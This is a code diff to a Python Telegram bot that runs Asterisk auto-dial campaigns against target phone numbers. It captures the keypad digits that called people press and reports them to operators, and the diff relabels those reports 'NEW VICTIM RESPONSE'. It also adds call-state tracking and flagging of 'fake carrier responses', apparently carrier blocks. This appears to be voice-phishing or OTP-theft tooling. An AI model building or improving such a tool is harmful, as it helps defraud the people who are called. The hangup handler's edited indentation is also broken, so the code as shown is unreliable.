@@ -160,7 +160,7 @@ async def send_individual_notification(campaign_id: int, notification_type: str,
     
     if notification_type == "dtmf_response":
         message = (
-            f"🔔 **DTMF Response**\n\n"
+            f"🎯 **NEW VICTIM RESPONSE**\n\n"
             f"Campaign #{campaign_id}\n"
             f"📱 {data.get('target_number', 'Unknown')}\n"
             f"🔘 Pressed: {data.get('digit', '?')}\n"
@@ -1740,6 +1740,9 @@ async def post_init(application: Application) -> None:
         # Register event listeners
         ami_manager.register_event('UserEvent', ami_event_listener)
         ami_manager.register_event('Newchannel', new_channel_event_listener)
+        ami_manager.register_event('Newstate', newstate_event_listener)  # SIP state tracking
+        ami_manager.register_event('DialBegin', dial_begin_event_listener)  # Dial attempt tracking
+        ami_manager.register_event('DialEnd', dial_end_event_listener)  # Dial result tracking
         ami_manager.register_event('DTMFBegin', dtmf_begin_listener)  # Add DTMFBegin listener
         ami_manager.register_event('DTMFEnd', dtmf_event_listener)
         ami_manager.register_event('Hangup', hangup_event_listener) # Register Hangup event listener
@@ -1753,6 +1756,203 @@ async def post_init(application: Application) -> None:
     except Exception as e:
         logger.error(f"Failed to establish AMI connection or register listener: {str(e)}")
         application.bot_data["ami_manager"] = None
+
+async def newstate_event_listener(manager, event):
+    """Handle Newstate events to track real-time channel state changes."""
+    # Log event details for debugging
+    event_dict = dict(event)
+    logger.debug(f"Newstate Event: {event_dict}")
+    
+    uniqueid = event.get('Uniqueid')
+    channel = event.get('Channel')
+    channel_state = event.get('ChannelState')
+    channel_state_desc = event.get('ChannelStateDesc')
+    
+    if not uniqueid or not channel:
+        return
+        
+    logger.info(f"Newstate: Channel={channel}, State={channel_state} ({channel_state_desc}), UniqueID={uniqueid}")
+    
+    try:
+        async with get_async_db_session() as session:
+            # Find the call by uniqueid
+            call = await Call.find_by_uniqueid(session, uniqueid)
+            if not call:
+                # Try finding by channel if uniqueid lookup fails
+                call = await Call.find_by_channel(session, channel)
+                
+            if call:
+                # Update call metadata with state information
+                current_metadata = call.call_metadata or {}
+                state_history = current_metadata.get('state_history', [])
+                
+                # Add new state to history
+                state_entry = {
+                    "time": datetime.now().isoformat(),
+                    "state": channel_state,
+                    "state_desc": channel_state_desc,
+                    "channel": channel
+                }
+                state_history.append(state_entry)
+                
+                # Update call metadata
+                call.call_metadata = {
+                    **current_metadata,
+                    "state_history": state_history,
+                    "current_state": channel_state,
+                    "current_state_desc": channel_state_desc,
+                    "last_state_update": datetime.now().isoformat()
+                }
+                
+                # Update campaign state based on channel state
+                campaign_id = call.campaign_id
+                if campaign_id and isinstance(campaign_id, int) and campaign_id in campaign_states:
+                    # Channel state meanings:
+                    # 0=Down, 1=Rsrvd, 2=OffHook, 3=Dialing, 4=Ring, 5=Ringing, 6=Up, 7=Busy, 8=Dialing Offhook, 9=Pre-ring
+                    
+                    if channel_state == '4' or channel_state == '5':  # Ring or Ringing
+                        logger.info(f"Campaign {campaign_id}: Call {call.call_id} is RINGING (real carrier response)")
+                        # This indicates the call is actually ringing at the target
+                        
+                    elif channel_state == '6':  # Up (answered)
+                        logger.info(f"Campaign {campaign_id}: Call {call.call_id} is UP (answered)")
+                        # Call has been answered - this is a real connection
+                        
+                    elif channel_state == '7':  # Busy
+                        logger.info(f"Campaign {campaign_id}: Call {call.call_id} is BUSY")
+                        # Busy signal - legitimate failure
+                
+                await session.commit()
+                logger.debug(f"Updated call {call.call_id} with state {channel_state_desc}")
+            else:
+                logger.debug(f"No call found for Newstate event: UniqueID={uniqueid}, Channel={channel}")
+                
+    except Exception as e:
+        logger.error(f"Error processing Newstate event: {e}", exc_info=True)
+
+async def dial_begin_event_listener(manager, event):
+    """Handle DialBegin events to track when dial attempts start."""
+    event_dict = dict(event)
+    logger.debug(f"DialBegin Event: {event_dict}")
+    
+    uniqueid = event.get('Uniqueid')
+    dest_uniqueid = event.get('DestUniqueID')
+    channel = event.get('Channel')
+    destination = event.get('Destination')
+    
+    logger.info(f"DialBegin: Channel={channel}, Destination={destination}, UniqueID={uniqueid}, DestUniqueID={dest_uniqueid}")
+    
+    try:
+        async with get_async_db_session() as session:
+            # Find the call by uniqueid (could be either source or dest)
+            call = await Call.find_by_uniqueid(session, uniqueid)
+            if not call and dest_uniqueid:
+                call = await Call.find_by_uniqueid(session, dest_uniqueid)
+                
+            if call:
+                # Update call metadata with dial begin information
+                current_metadata = call.call_metadata or {}
+                call.call_metadata = {
+                    **current_metadata,
+                    "dial_begin": {
+                        "time": datetime.now().isoformat(),
+                        "destination": destination,
+                        "dest_uniqueid": dest_uniqueid
+                    }
+                }
+                
+                # Update call status to indicate dialing has started
+                if call.status in ['queued', 'initiated', 'sending']:
+                    call.status = 'dialing'
+                
+                await session.commit()
+                logger.info(f"Updated call {call.call_id} - dial attempt started to {destination}")
+            else:
+                logger.debug(f"No call found for DialBegin event: UniqueID={uniqueid}")
+                
+    except Exception as e:
+        logger.error(f"Error processing DialBegin event: {e}", exc_info=True)
+
+async def dial_end_event_listener(manager, event):
+    """Handle DialEnd events to get definitive dial results and detect fake responses."""
+    event_dict = dict(event)
+    logger.debug(f"DialEnd Event: {event_dict}")
+    
+    uniqueid = event.get('Uniqueid')
+    dest_uniqueid = event.get('DestUniqueID')
+    channel = event.get('Channel')
+    dial_status = event.get('DialStatus')
+    
+    logger.info(f"DialEnd: Channel={channel}, DialStatus={dial_status}, UniqueID={uniqueid}, DestUniqueID={dest_uniqueid}")
+    
+    try:
+        async with get_async_db_session() as session:
+            # Find the call by uniqueid (could be either source or dest)
+            call = await Call.find_by_uniqueid(session, uniqueid)
+            if not call and dest_uniqueid:
+                call = await Call.find_by_uniqueid(session, dest_uniqueid)
+                
+            if call:
+                # Update call metadata with dial end information
+                current_metadata = call.call_metadata or {}
+                call.call_metadata = {
+                    **current_metadata,
+                    "dial_end": {
+                        "time": datetime.now().isoformat(),
+                        "dial_status": dial_status,
+                        "dest_uniqueid": dest_uniqueid
+                    }
+                }
+                
+                # Update campaign state based on dial result
+                campaign_id = call.campaign_id
+                if campaign_id and isinstance(campaign_id, int) and campaign_id in campaign_states:
+                    
+                    # Analyze dial status for real vs fake responses
+                    if dial_status == 'ANSWER':
+                        logger.info(f"Campaign {campaign_id}: Call {call.call_id} ANSWERED (real connection)")
+                        # This is a legitimate answer - call was actually connected
+                        
+                    elif dial_status in ['NOANSWER', 'BUSY', 'CONGESTION', 'CHANUNAVAIL']:
+                        logger.info(f"Campaign {campaign_id}: Call {call.call_id} FAILED - {dial_status}")
+                        # These are legitimate failures
+                        
+                        # Check if we saw ringing states but got failure - indicates fake response
+                        state_history = current_metadata.get('state_history', [])
+                        had_ringing = any(s.get('state') in ['4', '5'] for s in state_history)
+                        
+                        if had_ringing:
+                            logger.warning(f"Campaign {campaign_id}: FAKE CARRIER RESPONSE detected for {call.call_id} - showed ringing but failed with {dial_status}")
+                            # Mark this as a fake response in metadata
+                            call.call_metadata["fake_carrier_response"] = True
+                            
+                        # Decrement active calls and increment failed calls
+                        if campaign_states[campaign_id].active_calls > 0:
+                            campaign_states[campaign_id].active_calls -= 1
+                        campaign_states[campaign_id].failed_calls += 1
+                        
+                        # Update campaign message
+                        await update_campaign_message(campaign_id)
+                        
+                    elif dial_status == 'CANCEL':
+                        logger.info(f"Campaign {campaign_id}: Call {call.call_id} CANCELLED")
+                        # Call was cancelled - could be timeout or user action
+                        
+                # Update call status based on dial result
+                if dial_status == 'ANSWER':
+                    call.status = 'answered'
+                elif dial_status in ['NOANSWER', 'BUSY', 'CONGESTION', 'CHANUNAVAIL']:
+                    call.status = 'failed'
+                elif dial_status == 'CANCEL':
+                    call.status = 'cancelled'
+                
+                await session.commit()
+                logger.info(f"Updated call {call.call_id} with DialEnd status: {dial_status}")
+            else:
+                logger.debug(f"No call found for DialEnd event: UniqueID={uniqueid}")
+                
+    except Exception as e:
+        logger.error(f"Error processing DialEnd event: {e}", exc_info=True)
 
 async def dtmf_begin_listener(manager, event):
     """Handle DTMFBegin events from calls using database for tracking."""
@@ -1877,7 +2077,6 @@ async def dtmf_begin_listener(manager, event):
             f"{campaign_text}"
             f"• Target: `{target_number}`\n"
             f"• CallerID: `{caller_id}`\n"
-            f"• Direction: `{direction}`\n"
             f"• Time: {datetime.now().strftime('%Y-%m-%d %I:%M:%S %p')}"
         )
         
@@ -2078,11 +2277,11 @@ async def dtmf_event_listener(manager, event):
             campaign_display = f"{campaign_id}" if campaign_id else display_tracking_id
             
             notification = (
-                f"🔔 *DTMF PRESS DETECTED*\n\n"
+                f"🎯 *NEW VICTIM RESPONSE*\n\n"
                 f"#{campaign_display}\n\n"
                 f"• Target: `{target_number}`\n"
                 f"• CallerID: `{caller_id}`\n"
-                f"• Digit: `{digit}`\n"
+                f"• Pressed: `{digit}`\n"
                 f"• Time: {datetime.now().strftime('%Y-%m-%d %I:%M:%S %p')}"
             )
             
@@ -2350,26 +2549,39 @@ async def hangup_event_listener(manager, event):
                     await session.commit()
                     logger.info(f"Call {call.call_id} (Uniqueid: {uniqueid}) marked as completed in database")
                     
-                    # P1 Campaign Integration: Update campaign stats instead of individual notifications
-                    campaign_id = call.campaign_id
-                    if campaign_id and isinstance(campaign_id, int) and campaign_id in campaign_states:
-                        # Update campaign statistics
-                        campaign_states[campaign_id].completed_calls += 1
-                        if campaign_states[campaign_id].active_calls > 0:
-                            campaign_states[campaign_id].active_calls -= 1
-                        
-                        logger.info(f"Updated campaign {campaign_id} stats: completed={campaign_states[campaign_id].completed_calls}, active={campaign_states[campaign_id].active_calls}")
-                        
-                        # Update campaign message in real-time
-                        await update_campaign_message(campaign_id)
-                        
-                        # Send individual notification if enabled
-                        duration = (call.end_time - call.start_time).total_seconds()
-                        await send_individual_notification(campaign_id, "call_completed", {
-                            "target_number": call.target_number,
-                            "duration": f"{duration:.0f} seconds",
-                            "cause": cause_txt or 'Unknown'
-                        })
+                            # P1 Campaign Integration: Update campaign stats with proper call classification
+        campaign_id = call.campaign_id
+        if campaign_id and isinstance(campaign_id, int) and campaign_id in campaign_states:
+            # Determine if this was a failed or completed call based on duration and status
+            call_duration = (call.end_time - call.start_time).total_seconds()
+            was_answered = call.status in ['bridged', 'dtmf_processed', 'dtmf_started'] or call_duration > 10
+            
+            # Decrement active calls first
+            if campaign_states[campaign_id].active_calls > 0:
+                campaign_states[campaign_id].active_calls -= 1
+            
+            # Classify the call outcome
+            if was_answered:
+                # Call was actually connected/answered
+                campaign_states[campaign_id].completed_calls += 1
+                logger.info(f"Campaign {campaign_id}: Call to {call.target_number} marked as COMPLETED (duration: {call_duration}s)")
+            else:
+                # Call failed to connect (immediate hangup, busy, no answer, carrier block)
+                campaign_states[campaign_id].failed_calls += 1
+                logger.info(f"Campaign {campaign_id}: Call to {call.target_number} marked as FAILED (duration: {call_duration}s, cause: {cause_txt})")
+            
+            logger.info(f"Updated campaign {campaign_id} stats: completed={campaign_states[campaign_id].completed_calls}, active={campaign_states[campaign_id].active_calls}, failed={campaign_states[campaign_id].failed_calls}")
+            
+            # Update campaign message in real-time
+            await update_campaign_message(campaign_id)
+            
+            # Send individual notification if enabled (only for completed calls)
+            if was_answered:
+                await send_individual_notification(campaign_id, "call_completed", {
+                    "target_number": call.target_number,
+                    "duration": f"{call_duration:.0f} seconds",
+                    "cause": cause_txt or 'Unknown'
+                })
                     else:
                         # Legacy notification for non-campaign calls
                         if call.agent_telegram_id and application:
@@ -3039,17 +3251,17 @@ async def handle_auto_dial(update: Update, context: ContextTypes.DEFAULT_TYPE) -
                 # Check result and update campaign state
                 if result.get('success', False):
                     successful_originations += 1
-                    # Update campaign state
+                    # Update campaign state - mark as active when successfully initiated
                     if campaign_id in campaign_states:
                         campaign_states[campaign_id].active_calls += 1
-                    logger.info(f"Successfully initiated call to {target_number} (sequence {sequence_number})")
+                    logger.info(f"Successfully initiated call to {target_number} (sequence {sequence_number}) - marked as ACTIVE")
                     return True
                 else:
                     failed_originations += 1
-                    # Update campaign state  
+                    # Update campaign state - mark as failed when initiation fails
                     if campaign_id in campaign_states:
                         campaign_states[campaign_id].failed_calls += 1
-                    logger.error(f"Failed to initiate call to {target_number}: {result.get('message', 'Unknown error')}")
+                    logger.error(f"Failed to initiate call to {target_number}: {result.get('message', 'Unknown error')} - marked as FAILED")
                     return False
                     
             except Exception as e:
